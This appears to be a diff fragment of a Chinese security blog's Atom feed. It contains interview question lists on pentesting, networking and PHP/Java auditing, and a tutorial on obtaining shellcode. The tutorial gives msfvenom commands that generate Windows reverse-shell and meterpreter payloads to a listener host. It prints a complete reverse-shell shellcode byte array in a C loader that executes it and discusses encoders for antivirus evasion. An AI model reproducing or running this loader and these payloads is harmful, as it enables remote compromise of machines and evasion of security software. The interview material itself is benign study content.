+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自身方面的提问是对综合素质的考察。</p><span id="more"></span><h1 id="挖洞经历"><a href="#挖洞经历" class="headerlink" title="挖洞经历"></a>挖洞经历</h1><ol><li><p>介绍一下自己挖得印象最深&#x2F;挖得最有成就感&#x2F;挖得最有趣&#x2F;挖得最难的一个洞？</p></li><li><p>平时使用的比较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复方案？</p></li><li><p>Java中挖过的通用洞，会怎么利用&#x2F;组合？</p></li><li><p>讲一个你觉得有趣的漏洞案例</p></li><li><p>前段时间蓝凌OA的洞</p></li><li><p>了解什么比较新的漏洞</p></li><li><p>你在SRC挖掘中遇到最多的漏洞是什么？</p></li><li><p>有拿过cnvd证书吗</p></li></ol><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ol><li><p>如果给你一个网站，你的渗透测试思路是什么？在获取书面授权的前提下。</p></li><li><p>有什么比较曲折的渗透经历？</p></li><li><p>了解哪些漏洞？</p></li><li><p>写poc&#x2F;exp的经历和心得</p></li><li><p>复现的一些漏洞</p></li><li><p>简述一个网站的渗透测试思路</p></li><li><p>渗透大企业简单还是小企业简单，为什么</p></li><li><p>渗透的时候如何隐藏自己的身份？</p></li><li><p>给你一个后台登录地点的网站，你能从中发现哪些问题？</p></li><li><p>给你一千台服务器和交换机，你会如何进行扫描</p></li><li><p>复现过哪些漏洞，在哪里跟进漏洞？</p></li><li><p>你认为你的渗透水平在国内大概是什么水平，能给自己打多少分？</p></li><li><p>最得意的一次渗透测试</p></li><li><p>漏洞平台的贡献是多少，排名是多少？</p></li><li><p>代码审计的时候你比较关注的漏洞是哪些？</p></li></ol><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ol><li><p>有没有web服务开发经验？</p></li><li><p>编程能力</p></li><li><p>Java学到哪种程度了？</p></li></ol><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li><p>多久开始接触安全的？</p></li><li><p>熟悉安全的哪些内容？web？逆向？iot？在公司主要的工作内容？</p></li><li><p>安全工具的使用</p></li><li><p>自我介绍</p></li><li><p>hw经历</p></li><li><p>对红蓝对抗的看法</p></li><li><p>你觉得什么是你自己比较擅长的而我没有问到的？</p></li><li><p>针对web扫描器的爬虫，你怎么看？</p></li><li><p>企业内部安全</p></li><li><p>怎么判断目前是否是cms？</p></li><li><p>做过黑产吗？</p></li><li><p>以后的发展？</p></li><li><p>多久能学会？</p></li><li><p>说说你以前在你公司主要做什么安全工作？如每天，每月，每年做些什么安全工作？</p></li><li><p>你写过什么好的安全漏洞文章发布过吗？是否可以说说？</p></li><li><p>说说你的其它优势（如：对安全新兴技术的研究、个人博客、比赛、在校经历等）</p></li><li><p>说说大学这几年最自豪的事情</p></li><li><p>CTF你都做过哪些题型？</p></li><li><p>遇到的比较困难的web题型的ctf题目</p></li><li><p>假如让你设计一个waf，你会怎么设计？</p></li><li><p>有没有写过一些脚本？</p></li><li><p>为什么做这一行？</p></li><li><p>是否有在国外抓过肉鸡，有没有做黑产的朋友</p></li><li><p>是否能接受驻场？</p></li><li><p>都破解过哪些软件？如果给你一个产品，你能提出安全加固建议吗？</p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;自身方面的提问是对综合素质的考察。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="自身方面" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之计算机基础篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T14:26:52.752Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>地基。</p><span id="more"></span><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ol><li>什么是同源策略？</li></ol><p>源就是主机、协议、端口名的一个三元组。<br>同源策略(Same Origin Policy,SOP)是web应用程序的一种安全模型，被广泛地应用在处理web内容地各种客户端上，比如各大浏览器，Microsoft的Silverlight，Adobe的Flash&#x2F;Acrobat等等。同源策略限制不同源对当前document属性内容进行读取或设置。</p><ol start="2"><li>如何使得前端 referer 为空</li></ol><p>通过地址栏输入，书签里面选择或浏览器的插件BurpSuite修改。</p><ol start="3"><li>cookie参数，security是干什么的？</li></ol><p>expire: 可选的有效期参数，设置cookie变量保存时间。第一种是写入 session ，在浏览器会话期间有效，关闭浏览器则失效。另一种是需要把 date 对象转换成字符串再写入 cookie。<br>HttpOnly: 只有在http请求下才可使用，防止cookie被xss偷<br>https: 防止cookie在网络中被偷<br>Secure: 只有在https的请求下才可使用，阻止cookie在非https下传输<br>Path: 指定的某个路径这个 cookie 才能使用，这里的一般直接就是设置成 <code>\</code> ，当前目录下都可使用，因为只要是当前域下的，其实都可以使用。区分cookie的标识，安全上作用不大，和浏览器同源冲突</p><ol start="4"><li>cookie的P3P性质</li></ol><p>http响应头的P3P(Platform for Privacy Preferences Project)字段是W3C公布的一项隐私保护推荐标准，该字段用于标识是否允许<strong>目标网站的cookie</strong>被<strong>另一个域</strong>通过加载目标网站而设置或发送，仅IE执行了该策略。<br>将情形分为两类，分别是设置与发送：<br>（1）设置cookie。在IE下默认是不允许第三方域设置的，除非foo域在响应的时候带上P3P字段，这样设置后，被加载的目标域的cookie就可以被正常设置了。<br>（2）发送cookie。如果是内存cookie，无所谓是否有P3P属性，就可以正常发送；如果是本地cookie，则这个cookie必须拥有P3P属性。</p><ol start="5"><li>常见的网站服务器容器</li></ol><p>(1) Apache: 目前Apache仍然是世界上用得最多的Web服务器，市场占有率约为60%左右。源代码开放、有一支强大的开发团队、支持跨平台的应用（可以运行在几乎所有的Unix、Windows、Linux系统平台上）以及它的可移植性等方面。<br>(2) IIS: Microsoft的Web服务器产品为Internet Information Services。IIS 是允许在公共Intranet或Internet上发布信息的Web服务器。<br>(3) Nginx: 读作”engine x”，是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP代理服务器。<br>(4) Tomcat: Tomcat是一个开放源代码、运行Servlet和JSP的容器。TomcatServer实现了Servlet和JSP规范。<br>(5) WebLogic: BEA WebLogic Server是一种多功能、基于标准的Web应用服务器，为企业构建自己的应用提供了坚实的基础。<br>(6) WebSphere: WebSphere Application Server是功能完善、开放的Web应用程序服务器，是IBM电子商务计划的核心部分，它是基于Java的应用环境，用于建立、部署和管理Internet和Intranet Web应用程序，适应各种Web应用程序服务器的需要，范围从简单到高级直到企业级。<br>(7) Kangle: Kangle Web服务器是一款跨平台、功能强大、安全稳定、易操作的高性能Web服务器和反向代理服务器软件。此外，Kangle也是一款专为做虚拟主机研发的Web服务器。</p><ol start="6"><li>3306，1443，8080是什么端口？</li></ol><p>3306: MySQL<br>1443: SQL Server<br>8080: 代理端口</p><ol start="7"><li>计算机网络从物理层到应用层xxxx</li></ol><p>物理层，链路层，网络层，传输层，应用层</p><ol start="8"><li>token和referer做横向对比，谁安全等级高？</li></ol><p>token安全等级高。<br>Referer可以伪造，而且不是任何服务器都可以取得referer，如果从https跳到http，也不会发送referer。并且一些flash版本可以自定义referer。对于token要保证其足够随机且不可泄露。客户端建议存储到sessionstage里。</p><ol start="9"><li>对referer的验证，从什么角度去做？如果做，怎么杜绝问题</li></ol><p>对header中的referer的验证，一个是空referer，一个是referer过滤或检测不完善。<br>为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p><ol start="10"><li>针对token，对token哪方面进行测试</li></ol><p>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击。<br>信息泄露方面，可以是缓存、日志、get或利用跨站。<br>很多跳转的登录都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了。<br>另外也可以结合其它业务来描述token的安全性及设计怎么不好怎么被绕过比如抢红包业务之类的。</p><ol start="11"><li>SSL&#x2F;TLS握手过程</li></ol><p>SSL(安全套接字层)是为HTTP开发的原始安全协议。不久前，SSL被TLS(传输层安全性)所取代。SSL握手现在称为TLS握手。<br>TLS握手步骤大致如下：<br>(1) 客户端问候(client hello) 消息：客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的TLS版本，支持的密码套件，以及一串被称为“客户端随机数(client random)”的随机字节。<br>(2) 服务端问候(server hello) 消息：作为对client hello消息的回复，服务器发送一条消息，内含服务器的SSL证书、服务器选择的密码套件，以及“服务器随机数(server random)”，即由服务器生成的另一串随机字符。<br>(3) 身份验证：客户端使用颁发该证书的证书颁发机构验证服务器的SSL证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。<br>(4) 预主密钥：客户端再发送一串随机字节，即“预主密钥(premaster secret)”。预主密钥是使用公钥加密的，只能使用服务器的私钥解密。（客户端从服务器的SSL证书中获得公钥）。<br>(5) 私钥被使用：服务器对预主密钥进行解密。<br>(6) 生成会话密钥：客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同结果。<br>(7) 客户端就绪：客户端发送一条“已完成”消息，该消息用会话密钥加密。<br>(8) 服务端就绪：服务端发送一条“已完成”消息，该消息用会话密钥加密。<br>(9) 实现安全对称加密：已完成握手，并使用会话密钥继续进行通信。</p><ol start="12"><li>TCP三次握手过程以及对应的状态转换</li></ol><p>(1) 客户端向服务端发送一个SYN包，包含客户端使用的端口号呃初始序列号x；<br>(2) 服务端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y；<br>(3) 客户端收到服务端返回的SYN，ACK报文后，向服务器发送一个确认号为yy1、序列号为xx1的ACK报文，一个标准的TCP连接完成。</p><ol start="13"><li>TCP和UDP协议区别</li></ol><p>tcp面向连接，udp面向报文；tcp对系统资源的要求多，udp结构简单；tcp保证数据完整性和顺序，udp不保证</p><ol start="14"><li>https的建立过程</li></ol><p>(1) 客户端发送请求到服务器端<br>(2) 服务器端返回证书和公开密钥，公开密钥作为证书的一部分存在<br>(3) 客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端<br>(4) 服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端<br>(5) 客户端使用共享密钥解密数据<br>(6) SSL加密建立</p><ol start="15"><li>http状态码：503，502，501</li></ol><p>503: 由于超载或系统维护，服务器暂时无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中。<br>502: 作为网关或代理工作的服务器尝试执行请求时，从远程服务器收到了一个无效的响应。<br>501: 服务器不支持请求的功能，无法完成请求。</p><ol start="16"><li>http请求方式及各自作用</li></ol><p>(1) GET–请求指定的页面信息，并返回实体主体。<br>(2) HEAD–类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。<br>(3) POST–向指定资源提交数据进行处理请求（例如提交表单或上传文件）。数据被包含在请求体中。POST请求可能导致新的资源建立和&#x2F;或已有资源的修改。<br>(4) PUT–从客户端向服务器传送的数据取代指定的文档和内容。<br>(5) DELETE–请求服务器删除指定的内容。<br>(6) CONNECT–HTTP&#x2F;1.1协议中预留给能够连接改为管道方式的代理服务器。<br>(7) OPTIONS–允许客户端查看服务器性能。<br>(8) TRACE–回显服务器收到的请求。<br>(9) PATCH–是对PUT方法的补充，用来对已知资源进行局部更新。</p><ol start="17"><li><p>计算机网络的分层及分别有哪些协议？</p></li><li><p>HttpOnly</p></li><li><p>a.baidu.com和b.baidu.com是否同源</p></li><li><p>算法？了解过什么排序？</p></li><li><p>爬虫</p></li><li><p>页面存在很多js的时候，用什么</p></li><li><p>爬虫的待爬取URL量级比较大的时候，如何对其去重</p></li><li><p>多线程，异步，协程，多路复用 用哪一个最快，为什么？</p></li><li><p>浏览器的常用编码</p></li><li><p>web常用的加密算法有什么？</p></li><li><p>病毒和蠕虫的区别？</p></li><li><p>DNS欺骗</p></li><li><p>移动端的调试经验 apk，ipa包分析</p></li><li><p>对于云安全的理解</p></li><li><p>虚拟机逃逸的理解</p></li><li><p>dll文件是什么意思，有什么用？DLL劫持原理</p></li><li><p>get传参和post传参有什么区别？</p></li><li><p>讲一下HTTP双向认证</p></li><li><p>http的请求方式，具体说说</p></li><li><p>常见的http方法有哪些，他们之间的区别是什么？</p></li><li><p>常见状态码你知道吗？分别说一下200，201，301，302，500，503的含义</p></li><li><p>常见请求消息头的作用，分别说一下cookie, referer, user-agent的作用？</p></li><li><p>响应消息头的作用，分别说一下location, Access-Control-Allow-Origin, WWW-Authenticate</p></li><li><p>Cookie响应消息头的secure和httponly分别作用是什么？</p></li><li><p>静态、动态语言区别</p></li><li><p>常用的脚本语言和数据库有哪些？</p></li><li><p>系统、脚本语言、中间件如何组合？</p></li><li><p>会不会逆向APK，会不会嵌入式</p></li><li><p>正则能不能写？</p></li><li><p>对https了解吗？讲一下加密和解密流程？</p></li><li><p>陈述一下缓冲区溢出</p></li><li><p>jsonp安全攻防技术，怎么写jsonp的攻击页面</p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;地基。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="计算机基础" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备之语言篇</title>
+    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/"/>
+    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/</id>
+    <published>2023-09-02T16:00:00.000Z</published>
+    <updated>2023-09-04T02:54:09.633Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言基础是地基。</p><span id="more"></span><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li><p>php.ini可以设置哪些安全特性？</p></li><li><p>php的%00截断原理是什么？</p></li><li><p>php中命令执行涉及到的函数</p></li><li><p>代码执行、文件读取、命令执行的函数都有哪些？</p></li><li><p>PHP审计流程</p></li><li><p>vender目录</p></li><li><p>phpunit</p></li><li><p>php可以构造无文件shell吗？</p></li><li><p>PHP常见漏洞对应函数（命令执行，代码执行，文件包含，文件上传，文件删除，SSRF）</p></li><li><p>PHP的安全特性有关注吗？</p></li><li><p>代码审计（mvc&#x2F;非mvc）</p></li><li><p>简述PHP中造成任意文件下载漏洞的常见函数，以及造成漏洞的原因。</p></li><li><p>PHP作为弱类型语言，在底层它是怎么判断变量的类型的？</p></li></ol><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><ol><li><p>img标签除了onerror属性外，还有其它获取管理员路径的办法吗？</p></li><li><p>img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径？</p></li></ol><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><ol><li><p>命令的函数&#x2F;包</p></li><li><p>Java审计流程，一般关注哪些洞，或擅长挖哪些类型？</p></li><li><p>tomcat做回显</p></li><li><p>内存马的实现</p></li><li><p>Java执行命令的几种方式</p></li><li><p>反射，代理，类加载这些熟悉吗</p></li><li><p>代码审计</p></li><li></li></ol><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><ol><li><p>是否写过非脚本工具</p></li><li><p>代码审计</p></li><li><p>写出任意一种漏洞检测代码，用python实现</p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;语言基础是地基。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
+    
+    <category term="语言" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%AF%AD%E8%A8%80/"/>
+    
+    
+    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ShellCode获取</title>
+    <link href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/"/>
+    <id>http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/</id>
+    <published>2023-08-31T16:00:00.000Z</published>
+    <updated>2023-09-01T06:01:34.872Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shellcode的入门使用。</p><span id="more"></span><h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>shellcode可以按照攻击者控制是否在目标机器上执行载荷分为本地shellcode和远程shellcode。本地运行的shellcode经常用于在攻击者对计算机的访问权限有限，需要利用软件漏洞提升权限；远程shellcode常用于攻击者以运行在某个网络中的另一台机器上的易受攻击的进程为目标时，如果成功执行，shellcode可以通过网络访问目标主机。</p><h1 id="直接获取shellcode"><a href="#直接获取shellcode" class="headerlink" title="直接获取shellcode"></a>直接获取shellcode</h1><p>网络上有许多已经编写好的shellcode资源公开分享，由于shellcode的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是一个可以学习的网站。<br><a href="https://www.exploit-db.com/">Exploit Database</a><br>但来自网络的资源很有可能由于久久未更新、适用的系统已经被淘汰，或者是shellcode已经被公开而变得容易被查杀，这时候我们就需要能够即时获取shellcode的方法。</p><h1 id="通过软件获取shellcode"><a href="#通过软件获取shellcode" class="headerlink" title="通过软件获取shellcode"></a>通过软件获取shellcode</h1><h2 id="CobaltStrike-Ver-4-0"><a href="#CobaltStrike-Ver-4-0" class="headerlink" title="CobaltStrike(Ver 4.0)"></a>CobaltStrike(Ver 4.0)</h2><p><img src="/simg/shellcode_1.png" alt="cs"><br>勾选生成c语言形式的shellcode，在下拉列表里我们还能看到有许多其他语言形式的shellcode。<br><img src="/simg/shellcode_2.png" alt="cs"><br>接着我们会得到一个文件，其中包含了所需的shellcode，只要将这段shellcode放入预先写好的加载器中就可以使用了：<br><img src="/simg/shellcode_3.png" alt=" "></p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>MsfVenom 集成了msfpayload 和msfencode的功能，用于生成各种类型的payload</p><ol><li><p>首先查看可用的payload类型，需要Windows平台下的shellcode进行实验，所以使用命令<br><code>msfvenom --list payload |grep windows</code><br>挑选一个反弹shell的payload <code>windows/shell/reverse_tcp</code></p></li><li><p>查看支持的平台架构<br><code>msfvenom -p windows/shell/reverse_tcp --list archs</code><br>选择x64平台<br>实际测试中，要根据payload选择对应的平台，否则会提示Error: The selected arch is incompatible with the payload。<br>除此之外，本次测试中生成x64架构的shellcode并不能直接用c语言加载，可能是由于测试使用的gcc编译器是32位的。选择x86架构正常加载。</p></li><li><p>查看可用的payload格式<br><code>msfvenom -p windows/shell/reverse_tcp -a x64 --list formats</code><br>选择c语言格式的payload</p></li><li><p>使用–list-options查看payload需要配置的参数<br><code>msfvenom -p windows/shell/reverse_tcp --list-options</code></p></li><li><p>生成payload<br><code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.1 LPORT=2333 -a x86 -f c</code><br><img src="/simg/shellcode_4.png" alt=" "></p></li></ol><p>接下来开始测试生成的shellcode是否可用<br>首先使用msf设置好监听<br><img src="/simg/shellcode_5.png" alt=" "></p><p>将生成的shellcode放入c语言加载器中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x1f\x12\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行<br><img src="/simg/shellcode_7.png" alt=" "><br>成功弹回shell</p><p>接下来尝试弹回一个功能更强大的meterpreter<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -a x86 -f c</code></p><p>重新生成shellcode并在加载器中更换<br><img src="/simg/shellcode_8.png" alt=" "></p><h3 id="编码器的使用"><a href="#编码器的使用" class="headerlink" title="编码器的使用"></a>编码器的使用</h3><p>查看可用的编码器<br><code>msfvenom --list encoders</code><br><img src="/simg/shellcode_9.png" alt=" "></p><p>使用-e参数指定一个编码方式，使用-i参数指定编码次数<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -e x86/xor_dynamic -i 5 -a x86 -f c</code><br><img src="/simg/shellcode_10.png" alt=" "><br>生成的shellcode与不加编码器确实有所不同，但是免杀效果几乎没有，不能作为真正的免杀解决方案</p><h3 id="避免使用某些字符"><a href="#避免使用某些字符" class="headerlink" title="避免使用某些字符"></a>避免使用某些字符</h3><p>-b 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中<br>当这个参数被添加的时候，msfvenom 将会自动寻找合适的编码器来编码 Payload<br><img src="/simg/shellcode_11.png" alt=" "></p><h3 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h3><p><a href="https://github.com/Axx8/shellcode_loader">ShellCode_Loader</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实战中免杀效果不够。<br>免杀需要不断迭代，杀毒软件也会不断更新，没有永恒的免杀。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a><br><a href="https://luckyfuture.top/Msfvenom-Gen-ShellCode">使用MSF生成ShellCode</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;shellcode的入门使用。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
+    
+    
+    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>免杀基础学习</title>
+    <link href="http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
+    <published>2023-08-31T16:00:00.000Z</published>
+    <updated>2023-09-03T02:35:39.084Z</updated>
+    
